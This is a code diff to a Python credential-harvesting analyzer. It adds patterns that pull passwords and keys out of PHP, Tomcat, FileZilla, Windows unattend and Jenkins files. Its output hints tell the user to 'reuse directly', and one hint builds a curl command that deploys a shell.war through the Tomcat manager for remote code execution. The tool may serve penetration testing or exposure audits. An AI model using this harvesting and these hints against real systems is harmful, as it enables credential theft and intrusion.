@@ -45,6 +45,41 @@ _AD = [
     # mid-word in `SQLSVCPASSWORD`.
     ("MSSQL setup key", re.compile(
         r'(?i)\b(?:SA|AGTSVC|SQLSVC|RSSVC|ISSVC|FTSVC|ASSVC)(?:PWD|PASSWORD)\s*=\s*["\']?([^"\'\s\r\n]{3,})["\']?')),
+    # PHP define('CONST_*', 'value')  -  WordPress wp-config.php (DB_PASSWORD,
+    # AUTH_KEY, NONCE_SALT, etc.) plus any CONST whose name ends in PASSWORD /
+    # SECRET / KEY / TOKEN. `\bpass(word)?` won't catch DB_PASSWORD because
+    # the boundary fails between `B` and `P`.
+    ("PHP define secret", re.compile(
+        r"(?i)\bdefine\s*\(\s*['\"]([A-Z][A-Z0-9_]*(?:PASSWORD|PASS|PWD|SECRET|KEY|SALT|TOKEN))['\"]"
+        r"\s*,\s*['\"]([^'\"\r\n]{3,})['\"]")),
+    # Plain $varEndingInPwdLike = "X":  Joomla $password / $smtppass, MediaWiki
+    # $wgDBpassword / $wgSecretKey, Drupal $databases array values, any $\w*
+    # ending in password/pass/pwd/secret/salt/authtoken. We deliberately omit
+    # $key/$token (too generic - matches encryption-key config vars).
+    ("PHP var secret", re.compile(
+        r"(?i)\$\w*(?:password|passwd|pwd|secret|salt|authtoken|smtppass|ftppass|dbpass)\b"
+        r"\s*=\s*['\"]([^'\"\r\n]{3,})['\"]")),
+    # tomcat-users.xml <user username="X" password="Y" roles="Z"/>  - capture both
+    # user and pw, plus roles so the hint distinguishes RCE-path (manager-script /
+    # admin-gui) from read-only.
+    ("tomcat-users", re.compile(
+        r'(?i)<user\s+(?=[^>]*\busername\s*=\s*["\']([^"\']{1,40})["\'])'
+        r'(?=[^>]*\bpassword\s*=\s*["\']([^"\']{1,80})["\'])'
+        r'(?:[^>]*\broles\s*=\s*["\']([^"\']{0,200})["\'])?[^>]*/?>')),
+    # FileZilla / similar: <Pass encoding="base64">b64</Pass>
+    ("FileZilla pass", re.compile(
+        r'(?i)<Pass\s+encoding\s*=\s*["\']base64["\']\s*>([A-Za-z0-9+/=]{4,200})</Pass>')),
+    # Windows unattend.xml: <Value>X</Value> inside a Password/AdministratorPassword
+    # where <PlainText>true</PlainText> appears on the same line OR within ~80
+    # chars. (Plaintext branch only - the base64-UTF16LE branch needs proper XML
+    # context tracking and lives in a separate analyzer.)
+    ("unattend plaintext", re.compile(
+        r'(?i)<Password>\s*<Value>([^<\r\n]{3,})</Value>\s*<PlainText>\s*true\s*</PlainText>')),
+    # Jenkins encrypted blob in credentials.xml - cannot decrypt without master.key
+    # + hudson.util.Secret (the full chain), but flag the file as a high-value
+    # target and point to the offline decoder.
+    ("Jenkins enc blob", re.compile(
+        r'\{AQAAA[A-Za-z0-9+/=]{20,}\}')),
 ]
 
 
@@ -129,6 +164,68 @@ def analyze(path, report, store=None):
                     am = rx.search(line)
                     if not am:
                         continue
+                    # tomcat-users: user+pass+roles -> RCE-aware severity
+                    if name == "tomcat-users":
+                        u, p, roles = am.group(1), am.group(2), (am.group(3) or "")
+                        if not p or filters.is_placeholder(p):
+                            continue
+                        rce = any(r in roles.lower() for r in
+                                  ("manager-script", "manager-jmx", "admin-gui", "admin-script"))
+                        sev = "CRITICAL" if rce else "HIGH"
+                        cat = "CRED PAIRS" if rce else "ASSIGNED SECRETS"
+                        hint = (f"tomcat WAR-deploy RCE: curl --upload-file shell.war "
+                                f"-u '{u}:{p}' 'http://<host>:8080/manager/text/deploy?path=/shell'"
+                                if rce else
+                                f"tomcat login: u={u} p={p}; check /manager /host-manager")
+                        report.add(sev, cat, path, lineno, f"tomcat user '{u}':{p}" +
+                                   (f"  [{roles[:40]}]" if roles else ""), hint=hint)
+                        if store is not None:
+                            from analyzers.ingest.evidence import Evidence
+                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
+                                               source=path, line=lineno))
+                        hit = True
+                        break
+                    # FileZilla base64 obfuscation -> decode inline
+                    if name == "FileZilla pass":
+                        import base64 as _b64
+                        try:
+                            pw = _b64.b64decode(am.group(1), validate=True).decode("utf-8")
+                        except Exception:
+                            pw = am.group(1) + " (base64 - decode by hand)"
+                        if filters.is_placeholder(pw):
+                            continue
+                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
+                                   f"FileZilla saved password: {pw}",
+                                   hint="FileZilla base64 obfuscation - reuse directly")
+                        if store is not None:
+                            from analyzers.ingest.evidence import Evidence
+                            store.add(Evidence(kind="plaintext", plaintext=pw,
+                                               source=path, line=lineno))
+                        hit = True
+                        break
+                    # Jenkins encrypted blob: flag the file (cannot decrypt without
+                    # master.key + hudson.util.Secret) and point to the offline chain
+                    if name == "Jenkins enc blob":
+                        report.add("HIGH", "INTERESTING FILES", path, lineno,
+                                   "Jenkins credentials.xml encrypted blob",
+                                   hint="offline decrypt: hoto/jenkins-credentials-decryptor -m secrets/master.key "
+                                   "-s secrets/hudson.util.Secret -c credentials.xml")
+                        hit = True
+                        break
+                    # PHP define('CONST', 'value') -> 2-group capture
+                    if name == "PHP define secret":
+                        const, val = am.group(1), am.group(2)
+                        if not val or filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
+                            continue
+                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
+                                   f"{const}: {val}",
+                                   hint="PHP define() literal - reuse directly")
+                        if store is not None:
+                            from analyzers.ingest.evidence import Evidence
+                            store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
+                        hit = True
+                        break
+                    # default 1-group capture
                     val = am.group(1)
                     if not val or filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
                         continue
